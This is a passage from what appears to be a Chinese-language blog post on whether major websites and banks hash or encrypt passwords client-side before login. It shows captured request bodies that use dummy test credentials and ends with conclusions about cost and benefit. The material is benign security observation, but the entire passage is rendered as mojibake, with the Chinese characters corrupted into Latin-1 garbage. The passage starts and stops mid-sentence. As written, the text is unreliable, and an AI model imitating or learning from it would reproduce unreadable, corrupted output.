ç‚ºå„ç¨®åŸå› å¤±æ•ˆæ™‚ï¼Œæ”»æ“Šè€…ç„¡æ³•å–å¾—æ˜æ–‡å¯†ç¢¼ åœ¨ Server ç«¯ï¼Œæ²’æœ‰ä»»ä½•äººçŸ¥é“ä½¿ç”¨è€…çš„æ˜æ–‡å¯†ç¢¼ æ˜æ–‡å¯†ç¢¼ä¸æœƒå› ç‚ºäººç‚ºå¤±èª¤è¢«è¨˜éŒ„åˆ° log ä¸­ é‚£å¦‚æœçœŸçš„æ¯”è¼ƒå¥½ç”¨ï¼Œç‚ºä»€éº¼æ²’äººåœ¨ç”¨ï¼Ÿ\nç¾å¯¦ç”Ÿæ´»ä¸­ï¼Œåˆ°åº•æœ‰èª°åœ¨å‰ç«¯åš hash æˆ–æ˜¯åŠ å¯†ï¼Ÿ ç•¶æˆ‘ä¸€é–‹å§‹ç¢°åˆ°é€™å€‹å•é¡Œï¼Œè¬›å‡ºã€Œæ€éº¼æ²’äººåœ¨ç”¨ã€çš„æ™‚å€™ï¼Œå…¶å¯¦åªæ˜¯ã€Œæˆ‘è‡ªå·±æ²’ç¢°éæœ‰äººé€™æ¨£ç”¨ã€ï¼Œä½†å¯¦éš›ä¸Šæˆ‘ä¸¦ä¸çŸ¥é“é‚£äº›çŸ¥åç¶²ç«™çš„ç™»å…¥æ˜¯æ€éº¼åšçš„ã€‚\nå› æ­¤å‘¢ï¼Œæˆ‘å°±ç›´æ¥å»çœ‹äº†å¹¾å€‹çŸ¥åç¶²ç«™çš„ç™»å…¥æ©Ÿåˆ¶ï¼Œæˆ‘å€‘ä¸€èµ·ä¾†çœ‹ä¸€ä¸‹çµæœï¼Œç‚ºäº†æ–¹ä¾¿è§€çœ‹ï¼Œæˆ‘æŠŠè·Ÿå¸³è™Ÿå¯†ç¢¼ç„¡é—œçš„å…§å®¹éƒ½æ‹¿æ‰äº†ã€‚\næˆ‘åœ¨æ¸¬è©¦çš„æ™‚å€™ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯ç”¨ test æˆ–æ˜¯ test@test.com æ­é…ç°¡å–®çš„å¯†ç¢¼å¦‚ 1234 åœ¨æ¸¬è©¦ï¼Œç„¶å¾Œè§€å¯Ÿ request çš„å…§å®¹ã€‚\nå…ˆä¾†çœ‹ä¸€ä¸‹ FAANG å§ï¼\nFacebook API ç¶²å€ï¼šhttps://zh-tw.facebook.com/login\nè«‹æ±‚å…§å®¹ï¼š\n1 2 email=test@test.com encpass=#PWD_BROWSER:5:1673256089:AbJQAJUvZZNvh2dZbeDqdu9dp7HWwyHOl3+0sCGjiHMMjvYdxJokpdHE/O+E5LIbnakRmDWQfV40ZaB31MaNXFYo1b+RI+LHh6MAdDPa4PJ+BesDp4u8B4F4diVQ+q7idbEhT5wTNaU= æ²’æƒ³åˆ° Facebook å°±æ˜¯æœ‰å¯¦ä½œå‰ç«¯åŠ å¯†çš„ç¶²ç«™ï¼å¾Œé¢é‚£æ®µ Base64 ä¸¦ä¸æ˜¯ç›´æ¥æŠŠå¯†ç¢¼ Base64ï¼Œè€Œæ˜¯æŠŠåŠ å¯†éçš„å¯†ç¢¼åš Base64ï¼Œè§£å‡ºä¾†æ˜¯é€™æ¨£ï¼š\\x01Â²P\\x00\\x95/e\\x93o\\x87gYmÃ ÃªvÃ¯]Â§Â±Ã–Ãƒ!Ã\\x97\\x7FÂ´Â°!Â£\\x88s\\f\\x8EÃ¶\\x1DÃ„\\x9A$Â¥Ã‘Ã„Ã¼Ã¯\\x84Ã¤Â²\\x1B\\x9DÂ©\\x11\\x985\\x90}^4e wÃ”Ã†\\x8D\\\\V(Ã•Â¿\\x91#Ã¢Ã‡\\x87Â£\\x00t3ÃšÃ Ã²~\\x05Ã«\\x03Â§\\x8BÂ¼\\x07\\x81xv%PÃºÂ®Ã¢uÂ±!O\\x9C\\x135Â¥\nAmazon API ç¶²å€ï¼šhttps://www.amazon.com/ap/signin\nè«‹æ±‚å…§å®¹ï¼š\n1 email=test@test.com\u0026amp;password=1234 Apple API ç¶²å€ï¼šhttps://idmsa.apple.com/appleauth/auth/signin\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;accountName\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} Netflix API ç¶²å€ï¼šhttps://www.netflix.com/tw/login\nè«‹æ±‚å…§å®¹ï¼š\n1 userLoginId=test@test.com\u0026amp;password=1234 Google API ç¶²å€ï¼šhttps://accounts.google.com/v3/signin/_/AccountsSignInUi/data/batchexecute.\nè«‹æ±‚å…§å®¹ï¼š\n1 f.req=[[[\u0026#34;14hajb\u0026#34;,\u0026#34;[1,1,null,[1,null,null,null,[\\\u0026#34;1234\\\u0026#34;,null,true]]]] çœ‹ä¾† FAANG è£¡é¢ï¼Œåªæœ‰ Facebook æ˜¯æœ‰å¯¦ä½œçš„ã€‚\næ¥è‘—æˆ‘çªç„¶å¥½å¥‡èµ·å…¶ä»–å¸¸ç”¨æœå‹™çš„ç™»å…¥æœ‰æ²’æœ‰åšï¼Œåº•ä¸‹è²¼çµæœã€‚\nGitHub API ç¶²å€ï¼šhttps://github.com/session\nè«‹æ±‚å…§å®¹ï¼š\n1 login=test@test.com\u0026amp;password=1234 Microsoft API ç¶²å€ï¼šhttps://login.live.com/ppsecure/post.srf\nè«‹æ±‚å…§å®¹ï¼š\n1 login=test@test.com\u0026amp;passwd=1234 IBM cloud API ç¶²å€ï¼šhttps://cloud.ibm.com/login/doLogin\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;username\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} çœ‹ä¾†æœ‰å¯¦ä½œçš„æ˜¯å°‘æ•¸ï¼Œé‚£è³‡å®‰å» å•†å‘¢ï¼Ÿè³‡å®‰å» å•†è‡ªå·±æœ‰åšå—ï¼Ÿ\nè³‡å®‰å» å•†\nKaspersky API ç¶²å€ï¼šhttps://eu.uis.kaspersky.com/v3/logon/proceed\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;login\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;12345678\u0026#34;} è¶¨å‹¢ API ç¶²å€ï¼šhttps://sso1.trendmicro.com/api/usersigninauth\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;12345678\u0026#34;} Tenable API ç¶²å€ï¼šhttps://cloud.tenable.com/session\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;username\u0026#34;:\u0026#34;test\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} Proton é€™å€‹æ‡‰è©²ä¸ç®—è³‡å®‰å» å•†ï¼Œä½†çªç„¶å¾ˆå¥½å¥‡å¼·èª¿éš±ç§çš„ Proton æ˜¯æ€éº¼åšçš„ï¼Œä¸€çœ‹ç™¼ç¾å¥½åƒå¾ˆè¤‡é›œã€‚\nåœ¨ç™»å…¥çš„æ™‚å€™æœƒå…ˆæŠŠ username é€éå»ï¼Œæ‹¿åˆ°ä¸€äº›çœ‹èµ·ä¾†æ˜¯ key çš„æ±è¥¿ã€‚\nAPI ç¶²å€ï¼šhttps://account.proton.me/api/auth/info\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;Username\u0026#34;:\u0026#34;test@test.com\u0026#34;} 1 2 3 4 5 6 7 8 { \u0026#34;Code\u0026#34;:1000, \u0026#34;Modulus\u0026#34;:\u0026#34;-----BEGIN PGP SIGNED MESSAGE-----\\nHash: SHA256\\n\\nu9K5yr97L9VV2ijOSI62tJcewUiRhQa8qJa24baNpGyw0lf3JLiF4fxUHqTErwF9UdoxE0z4Kb147naphylBFddyKsjhzHNcxk2rBw9haiPxD69BrVYm0n+LVlPqmjXFF7btr1H7oqHGX4b4Dy9omL/KaZz/Dco2NEhw0UBhEZbTAs6Ch01ur9XLbSOI7yb6MRsqCehfy82gDTdbPtXvqQsQjg5XoC2Ib2qTYFaU/24mq/gOaMbVuAGX0hBYzr5NpN9ol2XCdHOLg28Xe90+kisg39VV04axy7Ndvh489dC1CxjcWSSpXd6cPJyOn/HH9aPeTZeucBllRGbPgwR6/w==\\n-----BEGIN PGP SIGNATURE-----\\nVersion: ProtonMail\\nComment: https://protonmail.com\\n\\nwl4EARYIABAFAlwB1j0JEDUFhcTpUY8mAAD1GwEAoC91QCSfXPEuWM13NZvy\\nvL9NQIABuSrVOvgJwMhUTnUBAPb4zbIdTYFOQNrPLvonJt2mmRNy4lGcW7uN\\n5yHzJ18J\\n=Oykn\\n-----END PGP SIGNATURE-----\\n\u0026#34;, \u0026#34;ServerEphemeral\u0026#34;:\u0026#34;DY6eRYM1bqYZZ5jzZFdWv88tKYP2PnS0y4A+f7/eqMXj8wB2VefV2kfIDrZ5AorWfDzBq4wMtNG2k5dzbT2qWppzpvltrSl2Nm4i8eWIRVxXWHl/46dGuPXFHUcXBNMP3XEQvft0YEbHOPO9Es0RZRaObV5XPFyx6kzOJxXc1tIt4PfbhODMfsAoy/yxt6eLN3HUiORCBOvzsH2sfG99Gx1YSAe3GL6g/K+bdg59eglueXRESoB0/VFRsvQevi9nVXx/JZNTG0U4BBUOlMjpYYMgEP6eQgZZ/09ZPYD3a2tW65mSnNt6lSDfwiKj02UuDqymTvj7mYm44T0SuAocwg==\u0026#34;, \u0026#34;Version\u0026#34;:4, \u0026#34;Salt\u0026#34;:\u0026#34;dI7OcD+K4rGPBA==\u0026#34;, \u0026#34;SRPSession\u0026#34;:\u0026#34;3fa6224285409b6af07c811971e05341\u0026#34; } æ¥è‘—è¼¸å…¥å¯†ç¢¼ç™»å…¥æ™‚ï¼Œæœƒé€å‡ºå¦‚ä¸‹çš„ requestï¼Œçœ‹èµ·ä¾†ä¹Ÿå¾ˆè¤‡é›œï¼š\n1 2 3 4 5 6 7 8 9 { \u0026#34;ClientProof\u0026#34;:\u0026#34;I9Nfd0Nd3OzODf2nt9zLxFHWogEwfRje8zjoeZnblyLfyzz23uXTjJ4qgRFomjIEEtZrlM1jTQa4wRIMGIIV7E6pMqq8c6wcc2tegP4Xt76S0EbnVtE1F9i0Wj46aCPUM0Mha3Zmgi9LKerrGlaftr2FBedjPFT9rPrbLqRQcFNMD33tn69gD/p28q4RAr3/7d/tz7TYhytD5oxCAUwrkqiZOi0kg//2mUJ9YNT2nWcgqUERoaU51NbNMcaPnMteEe1PlIJdiQbvNa5K07u8rk7itpBrGW2FP26bREp0UMTzNYM5HcDDkmp4dp9GoBjFJL9n0THUdt/oRRJ/Enj5WQ==\u0026#34;, \u0026#34;ClientEphemeral\u0026#34;:\u0026#34;D013N7FXYHylqMeWa6ctJIv3J4uF1hqodyYfw6O+Sj7MZOIB+wksfgk/nkXCmRxQhuSYwqwMJIpyFD3MEolOZAHMU2n6HQlxe9A4KbrE4gk3UiGwfgcZDmFejTmMMxfWhf4zO2Z1fBbohreqwwN0mz3AqqsfE5dsDh3LEfkiJB449YGZfHeUHyIzS1jTmnx/8l6uVSKwJDCJelVFYKMXrxVt0ltcGRoYD92MUj82kR0am+BN4+djHyYYXuwuIYArnTW4kDP3T2yCIAMVgZnFaUCc2gfynt40mQP4q87jmMELOl8TDIDo5iKyH4gJc/470qIuIyj4ffVLiZ7t8S+kcw==\u0026#34;, \u0026#34;SRPSession\u0026#34;:\u0026#34;3fa6224285409b6af07c811971e05341\u0026#34;, \u0026#34;Username\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;Payload\u0026#34;:{ \u0026#34;qcA_CRYU6gSyHWdn\u0026#34;:\u0026#34;c6UZSKPo4Sfm/3+DvQN72TTxyj+/TplKT9edDiUI5wMfGUsoJs9FGerOtkoW8T49r7KOvqHkzS2+M2v8ra7J9l5kSf5jgC9ZvgZ8Ja5Xgg02nxgAABydOirGLoL4htFsYVtwLrNg8NeSEanLwYLCVaSqkjANRJks0eaKpUOd8xRhCFtUH/GCbyg27oZfzDsqKXemKprOUsOh42NTqzEmruAkxs2x8mUsLy/vXptVAdaiJLrsSRqD0YBGjvOp4W2/0g6V2zfedJpJEzVwtSi1vXTC5bwxmEJlYdV9AiQECogAAJFxLQi7JjtmgFe4tNcv97JD0B8giZ6XS35swjz0vz0mOjVBUwmiDa8n54Y5kBaAoZe5pijdp2S4SOcRAknDIcD1nf0v7oSMOE9WtH/sa+XI1D2s5lFKo/iInf7r5R9src2hHFoy0b2XT0oCfLPwFX87yjaKbf7bbkjByx/3dOgzEliAkS6nHK+fmeDDVM4EoZqVSKZHLg3QTcg4DKaICyDsotALr2UqI/ARzkX4yhAXz5xHFaxl6hWAKLJPJcgk6il6oX0s0PCBNSY0Fi3vbQvXD4WalUx+LBNto6CUqeAIzVuAh8sCubzufoSORypE5WqfnuJzAlZ9sMEjaQycuRi497aV3jmjgx53UwO0OiZGxDTEMFBcov4P0g1blZ4vxmULhZU0RfdP31udLr6GTCAB90CM6Vk9w9CsYM+hmo3+JpEAtIVgLVVqcPikTbV+yaOJ1RknxBf3g06kTl0LQ+zBV6pG2rFVi8G4XT9L4FsIgxTNsl/ryzs8vJU7K+HvyE1Lp2pAXrfcju7TAIqK/FOXvp1c8Ay9O6d4fmd/PZalnRDv5mQ6Gmd6JSNzNh6i6AibBuF13w3OBaulY3FGNU/cH/AXLBIqjSzf/OySwkKkC9HBurSs3D0zqcH9BwUpmPEL8jbc8yPE+hPAim+tDo1BXCQNClxgGLaI6FXkuCiQ4AHiKsq0xs5b3WAFzcvBv1rc003RWxRegH/2teIooKU9w1kDPQRaK8/rIYe8u+BlBeZq4OwCXxx56JHfmTxtJwBi95KqsWzLGtY3ILcb+/XkzSRmE2TWbkW1IXzRsl8F6NSJj7JnHA3UrQf4hxuwbaYxpKJrcHuHc8e1wxqXrUSKooCOUxwSBgxvLLT37eaByNTxpfWomxIsH671wuydnmMedWyNIqyaMtxBORuiWUiG4jbMC2BjrVptXJ7VWigf3Vy5OQlMOyTx8tLWi1qZODYyywMBAvHYQlFfSqmIrm4y4dmK/srJE/+daEnNS+kWF48Jm/rQORO5AUwqWL+Lefg9pchcL1BnHOANcviO8pAkxLo8TiK7VLKI5/xUsZQoQSlhRt27zMF+sIv+exY375HApiY+a1VQ6OqE4Nvba7O8ETLoLFg4a8Aj+W8erXFHW5F0vVIRphAve9orM4QYnAmOigFAiLb0Pxx124wUjFR9s5oP98hAtNL/t+uGAXrb0oxiCfyHb9wa2Qb0x6o9FpuBIc5ZXId+cEXEvOdqhnUQ7ZuOi/fX81hlqgUaiD/A6P+zjAcREXdktd+hrhSXwCIKSBkp/mNymnalQKJkLaNVT+W2sOWqXxTSTIytCQx36xABcj1BXRApntob6Qvche8QJLTjzr9bDpn+Mo59N9PSU51DPIj5Avre6ChTHEQvjz9s1IM2XroBX/KFBnPj33aYQZyov4uxrVXxic+fiY+fLMF8x1ut/eNWeQU6fn+rU5PEGQ9bbAsjVBZYA5H93ROhO5lnSxoEk5PHkgQ9WpxueckPjJIUGAs+O8QMRFicccfKjhNIc32rXTqbVqLyoz62riDn8Y18MUBoeI8ORyqZOKEEBFsi5dwqoq8t82NFdx5LFjsLdk4RmMXZ2uygNLk8gH2Yyfu3iOQS2bKtNCW42Xmo66Xu5kt8NwAneYQK0mTn6HUv94K10J4hY+Q=\u0026#34; } } è£œå……ï¼šç¶“è¨è«–ä¸²æœ‰äººæé†’å¾Œç™¼ç¾é€™æ˜¯ä¸€å€‹å«åš SRPï¼ˆSecure Remote Passwordï¼‰çš„å”è­°ï¼ŒProton æœ‰æä¾›ä¸€å€‹ ProtonMail Security Features and Infrastructureï¼Œè£¡é¢æœ‰è¨˜éŒ„ä»–å€‘çš„å®‰å…¨æªæ–½ï¼Œå°±æœ‰è¬›åˆ°é€™å€‹æ©Ÿåˆ¶ã€‚\nçœ‹èµ·ä¾†æ»¿è¤‡é›œè¦èŠ±ä¸å°‘æ™‚é–“ç ”ç©¶ï¼Œå…ˆæ”¾è‘—ï¼Œæœ‰èˆˆè¶£çš„å¯ä»¥åƒè€ƒï¼šSRPâ€Šâ€”â€Šæ›´å¥å…¨çš„ç™»å…¥åŠè³‡æ–™å‚³è¼¸ä¿è­·å”è­°\né›–ç„¶æ›´å®‰å…¨ï¼Œä½†æˆæœ¬æ‡‰è©²åˆæ›´é«˜äº†ã€‚\näº¤æ˜“æ‰€èˆ‡éŠ€è¡Œ çœ‹å®Œä¸Šé¢æ¡ˆä¾‹ç™¼ç¾æœ‰åšçš„æ˜¯å°‘æ•¸ï¼Œå› æ­¤æˆ‘å¥½å¥‡æ›´æ³¨é‡å®‰å…¨çš„åŠ å¯†è²¨å¹£äº¤æ˜“æ‰€èˆ‡å‚³çµ±éŠ€è¡Œæœ‰æ²’æœ‰åšã€‚\nBinance API ç¶²å€ï¼šhttps://accounts.binance.com/bapi/accounts/v2/public/authcenter/login\nè«‹æ±‚å…§å®¹ï¼š\n1 2 3 4 5 { \u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;fe2e6b4138fcd7f27a32bc9af557d69a\u0026#34;, \u0026#34;safePassword\u0026#34;:\u0026#34;d404559f602eab6fd602ac7680dacbfaadd13630335e951f097af3900e9de176b6db28512f2e000b9d04fba5133e8b1c6e8df59db3a8ab9d60be4b97cc9e81db\u0026#34; } Coinbase API ç¶²å€ï¼šhttps://login.coinbase.com/api/v1/authenticate-credentials\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;email\u0026#34;:\u0026#34;test@test.com\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} kraken API ç¶²å€ï¼šhttps://www.kraken.com/api/internal/account/settings/tfa\nè«‹æ±‚å…§å®¹ï¼š\n1 {\u0026#34;username\u0026#34;:\u0026#34;test\u0026#34;, \u0026#34;password\u0026#34;:\u0026#34;1234\u0026#34;} ç‰å±±éŠ€è¡Œ API ç¶²å€ï¼šhttps://ebank.esunbank.com.tw/fco/fco08001/FCO08001_Home.faces\nè«‹æ±‚å…§å®¹ï¼š\n1 2 3 loginform:custid=A0000... loginform:name=mxagZmaqygDx0XX6784Svw==__NgZQcFfAx+lQmPza2eNpOA== loginform:pxsswd=8,lIRnuUxw/yStOt9QIYG2U3Gn2XkG03x4Ey/UU6JGtsbUxfRXoAv9CjE3EWerDN3tfx3dD/B3ChLAPMSG2BA3jMXUCZC06y8UbQ5isKc9fCWZSSZAWWcOmJ7LdXw1ZhjV55hpw1upvAr9WEmZ0XF6x7if+dBxJ4KZ00d83qA9eA+3VaSk+JLhN8/CFBfTKTfJEs3PDNsm12XzRUBb4YE1aPQosVX10mdvh3zY5lmkrKuq8gnuImEf3oLOk4EF3eVpr6jJiFzMKlHybvGdtKYS25+pgTS68wn3v023barbSmgivcv5atm0XsyXWDY2dKEtdQz+7A6R+AB0bExbQlRjqQ== åœ‹æ³°ä¸–è¯ API ç¶²å€ï¼šhttps://www.cathaybk.com.tw/MyBank/Quicklinks/Home/NormalSignin\nè«‹æ±‚å…§å®¹ï¼š\n1 2 3 CustID=A000... UserId=DC0C6E52BE2A2354C53401207F220F1B Password=8cf5e1977f149ed0362629007a7f91d0efc7b12cb1895ba701c528a12b38d12f8148ca03ee671fe25d2a3a807be980f7728566e359a675734ce046899b147658388bb60f9b900e2ccc9adac280b54b5f2e28cb7eee1b634d0e1ed1c0c0c598c350f61eb003405559331a7f047add7289466bf42cfd5b9e774a1fa116af4fd7050adb8f174d42a8e2098a014a788bd2ffae3bf4ff7a8d8d7e2e8068402fda395da41be6e5d32f2d32cbee2afc26e82c58b60357b5cb186a3b9cf69df2deb9da8c9fde45337935180cb4e177109413d7a758d38bfc8334a4509d8d8fb6a37080f0e0086b4a5ef68f7809ca2ef97183b7f66d996873bb7dbfcee61d2da424b8b968 ä¸­åœ‹ä¿¡è¨— API ç¶²å€ï¼šhttps://www.ctbcbank.com/IB/api/adapters/IB_Adapter/resource/preLogin\nè«‹æ±‚å…§å®¹ï¼š\n1 2 3 4 5 6 7 { \u0026#34;rqData\u0026#34;: { \u0026#34;custId\u0026#34;: \u0026#34;A00....\u0026#34;, \u0026#34;pin\u0026#34;: \u0026#34;878dbee38bbb4d77a30ee128f55f7bfe2169e45380d62a75453d3ca175e8ce8b|43d0499147b62adeec4eef3c77d33171b4569d0bdf7bbbe2b8b9bde3d30a26aba69aadfb28dfbaa9a997a0ccf668aaab0b6da582275175272172569a58a60bbfc5ac3a8c6862ce31f86247d7c1adf307e363c0f251fb88c4d39afa6ed0ca0a49e053f4f90000fa77b4e78beaead72ebdf52a13ecb4f20ae9a532947fad8156d5ec69d6763243364e71659079e469d1e01d0c384b0c71f4e9e524890227d82a51a340ef0b48638e05e347d75cb93d4a825a2bce6a90ef47f512351ee2d0d1ea17fb8afd521e427578603ea775191711f81d8dcb18e46b72daf3a49a60e50d12d3887e3bafab3758730f7fb0276373ebe1da01a03162ec8e73a202091a51b7f88d\u0026#34;, \u0026#34;userId\u0026#34;: \u0026#34;bfcdb9b2d6896a3bfb4a6542e8fb2689486d000b11bdc0c7bc336a6534aec74c|1b1a758bb26702bc0ac7cd660da2a72866f2cfdcf3668f2d39a5f8b006854f52a08f418b0a460b36374f95b7a310d73ea9994788698041f524ecd1f153448ab5d51f901a9a08ac2a9ee04c5c273ecb9d4ec1b6a62e9696c6126271e2f8c334fe17ce8b8538139363b90be75c1130cb251ec240bd26c920b52f5be9fc59094ce7d935d826242d69dc1ff7047a5abbf11d3c7de639a14bb10230912903cd948c05b3b3cb0cdb100f979640e291774e623a7109bde7b55bb8a6a373c0ca12820b072132ea61c845e60e26d09c7ee0fe23f7de286cbccb067a86fd1985c5b455f9ae46ce24dc8f52bcb05c205d6a462345162ae82c35e045bf3fd43a297c3edcfe17\u0026#34; } } ç¾åœ‹éŠ€è¡Œ API ç¶²å€ï¼šhttps://m.globalcard.bankofamerica.com/pkmslogin.form\nè«‹æ±‚å…§å®¹ï¼š\n1 2 username=fcc63767-1a43-4cc6-8c3e-1346350b5274 password=12345678 æ–°åŠ å¡æ˜Ÿå±•éŠ€è¡Œ API ç¶²å€ï¼šhttps://internet-banking.dbs.com.sg/IB/Welcome\nè«‹æ±‚å…§å®¹ï¼š\n1 2 USER_LOGON_NAME=test123 ENCRYPTED_PIN_BLOCK=A8C48B7572A1A53C5A66E9B43365027C7FBF14BF461F480A46781E49648A8F70271A29C374F86FCD55A76ED17B2284B47C799B74475F29749D68631FF7E322177A21EEE8C41D8950638A2828C34A2653D7C9F69F5DA568E42D64CE89FCE8F024217B235835E6F8BC3C536F56361EDF459AFCE9A512BDBACAB2D25423209996C2E84A18EA8446685DAF9FAD4B1D6D8DF0F378EC27D9A81AD4D1A2B91BA3CFD838140A9BD48AD8D38D33B0093110BD1CA2C76F3DE4CBD969A9B0260DB890E9B1A99DC1193BFE9A1EDB3E56F71CB1CD8630558B242B040F733A4A40B2E17DE6DA03A58DEC8BB12DA87BB25971E2DBE5AF7AE6112266A3F9027B449BDF46D8DC0A1A çµè«– åœ¨éš¨æ©Ÿæƒ³åˆ°çš„ 20 å€‹ç¶²ç«™ä¸­ï¼Œæœ‰ 7 å€‹æœ‰åœ¨å‰ç«¯åšåŠ å¯†æˆ–æ˜¯ hashï¼ˆæˆ‘æ‡¶å¾—çœ‹æ˜¯å“ªå€‹äº†ï¼Œç¸½ä¹‹æœ‰åšäº‹å°±å°äº†ï¼‰ï¼Œåå–®æ˜¯ï¼š\nFacebook Proton Binance ç‰å±±éŠ€è¡Œ åœ‹æ³°ä¸–è¯ ä¸­åœ‹ä¿¡è¨— æ–°åŠ å¡æ˜Ÿå±•éŠ€è¡Œ é›–ç„¶èªª 35% çœ‹èµ·ä¾†å¾ˆé«˜ï¼Œä½†é‚£æ˜¯å› ç‚ºéŠ€è¡Œä½”äº†å¤§å¤šæ•¸ï¼Œä¸€èˆ¬ç¶²ç«™å‰‡æ˜¯å¾ˆå°‘å¯¦ä½œé€™å€‹æ©Ÿåˆ¶ã€‚\nå¯«åˆ°é€™é‚Šï¼Œå¯ä»¥ä¾†ä¸‹çµè«–äº†ã€‚\nç¬¬ä¸€å€‹çµè«–æ˜¯ï¼š ã€Œåœ¨ client ç«¯å‚³é€å¯†ç¢¼å‰å…ˆæŠŠå¯†ç¢¼åŠ å¯†æˆ–æ˜¯ hashï¼Œç¢ºå¯¦èƒ½å¤ å¢åŠ å®‰å…¨æ€§ã€\nç†ç”±æ˜¯åšäº†ä»¥å¾Œï¼Œèƒ½å¤ é”æˆä»¥ä¸‹äº‹é …ï¼š\nHTTPS å› ç‚ºå„ç¨®åŸå› å¤±æ•ˆæ™‚ï¼Œæ”»æ“Šè€…ç„¡æ³•å–å¾—æ˜æ–‡å¯†ç¢¼ åœ¨ Server ç«¯ï¼Œæ²’æœ‰ä»»ä½•äººçŸ¥é“ä½¿ç”¨è€…çš„æ˜æ–‡å¯†ç¢¼ æ˜æ–‡å¯†ç¢¼ä¸æœƒå› ç‚ºäººç‚ºå¤±èª¤è¢«è¨˜éŒ„åˆ° log ä¸­ ä»¥ä¸Šéƒ½æ˜¯æ²’æœ‰åœ¨ client åŠ å¯†æˆ–æ˜¯ hash æ™‚åšä¸åˆ°çš„ã€‚\nç¬¬äºŒå€‹çµè«–æ˜¯ï¼š ã€Œç¢ºå¯¦æœ‰äº›å¤§å…¬å¸æœ‰åšé€™å€‹æ©Ÿåˆ¶ï¼Œä½†æ˜¯éå¤§å¤šæ•¸ï¼Œä¸éåœ¨éŠ€è¡Œæ¥­ä¼¼ä¹æ˜¯ä¸»æµã€\né€™å€‹çµè«–ä¸Šé¢æœ‰è²¼å®Œæ•´çš„è³‡æ–™äº†ï¼Œä¸€èˆ¬çš„ç¶²ç«™å¾ˆå°‘åšé€™å€‹æ©Ÿåˆ¶ï¼Œä½†é‚„æ˜¯æœ‰äººåšã€‚\nç¬¬ä¸‰å€‹çµè«–æ˜¯ï¼š ã€Œé›–ç„¶å¾æŠ€è¡“ä¸Šä¾†çœ‹èƒ½å¤ å¢åŠ å®‰å…¨æ€§ï¼Œä½†å¯¦éš›ä¸Šæ˜¯å¦å¯¦ä½œï¼Œä»ç„¶è¦è€ƒæ…®å…¶ä»–å› ç´ ã€\né€™å› ç´ å°±æ˜¯æˆ‘å‰é¢æéçš„ã€Œå¯èƒ½æ€§ã€é‚„æœ‰é–‹é ­æˆ‘è¬›å…ˆä¸è«‡çš„ã€Œæˆæœ¬ã€ã€‚\nè‹¥æ˜¯çœŸçš„æ¯”è¼ƒå®‰å…¨ï¼Œç‚ºä»€éº¼ä¸€èˆ¬ç¶²ç«™ä¸æœƒå¯¦ä½œé€™å€‹æ©Ÿåˆ¶ï¼Ÿ\næˆ–è¨±æ˜¯å› ç‚ºè¦ºå¾— HTTPS è¢«æ”»ç ´çš„å¯èƒ½æ€§å¤ªä½ï¼Œä½åˆ°å¯ä»¥å¿½ç•¥ä¸è¨ˆï¼ˆæˆ‘ç›¸ä¿¡é€™æ˜¯å¤§å¤šæ•¸ç•™è¨€çš„äººè¦ºå¾—ä¸éœ€è¦åšçš„ç†ç”±ï¼Œæˆ‘ä¹ŸåŒæ„é€™é»ï¼‰ï¼Œä¹Ÿæˆ–è¨±æ˜¯æˆæœ¬å¤ªé«˜ï¼Œæœƒå¢åŠ ç¨‹å¼ç¢¼è¤‡é›œåº¦ï¼›è‹¥æ˜¯æ¡ç”¨åŠ å¯†çš„æ–¹æ¡ˆï¼Œä¹Ÿæœƒæ¶ˆè€—æ›´å¤šé‹ç®—çš„è³‡æºåœ¨åŠ è§£å¯†ä¸Šé¢ï¼Œé€™ä¹Ÿæ˜¯æˆæœ¬ã€‚\né€™å°±æ˜¯æˆ‘è¦ºå¾—æ‡‰è©²è¬›æ¸…æ¥šçš„åœ°æ–¹ã€‚\nåœ¨å‰ç«¯å…ˆåš hash æˆ–æ˜¯åŠ å¯†ï¼Œå®ƒç¢ºå¯¦æ˜¯æœ‰å„ªé»çš„ï¼Œä¸æ˜¯å¤šæ­¤ä¸€èˆ‰ï¼Œä¹Ÿä¸æ˜¯æ²’æœ‰æ„ç¾©ï¼Œæ›´ä¸æ˜¯è®“ç³»çµ±è®Šå¾—æ›´å±éšªã€‚\nä½†é€™ä¸ä»£è¡¨æ¯å€‹ç³»çµ±éƒ½è©²å¯¦ä½œé€™å€‹æ©Ÿåˆ¶ï¼Œå› ç‚ºå®ƒå¸¶ä¾†çš„æ•ˆç›Šæˆ–è¨±æ²’æœ‰æˆæœ¬é«˜ï¼Œé€™å€‹ç«¯çœ‹å„å€‹å…¬å¸çš„è€ƒé‡ã€‚å°å¤§éƒ¨åˆ†çš„å…¬å¸ä¾†èªªï¼Œèˆ‡å…¶ç‚ºäº† HTTPS å¤±æ•ˆé€™å€‹æ¥µä½çš„å¯èƒ½æ€§å»æŠ•å…¥æˆæœ¬ï¼Œä¸å¦‚æŠŠæ™‚é–“èŠ±åœ¨åŠ å¼·å…¶ä»–ç™»å…¥ç’°ç¯€çš„å®‰å…¨æ€§ï¼ˆä¾‹å¦‚èªª 2FA å•¦ï¼Œæˆ–æ˜¯ä¸åŒè£ç½®ç™»éŒ„è­¦å‘Šç­‰ç­‰ï¼‰ï¼Œå¸¶ä¾†çš„æ•ˆç›Šæœƒæ›´é«˜ã€‚\næœ‰äº›æœå‹™é‚„æœƒé¸æ“‡æŠŠæ•´åŒ… request éƒ½åŠ 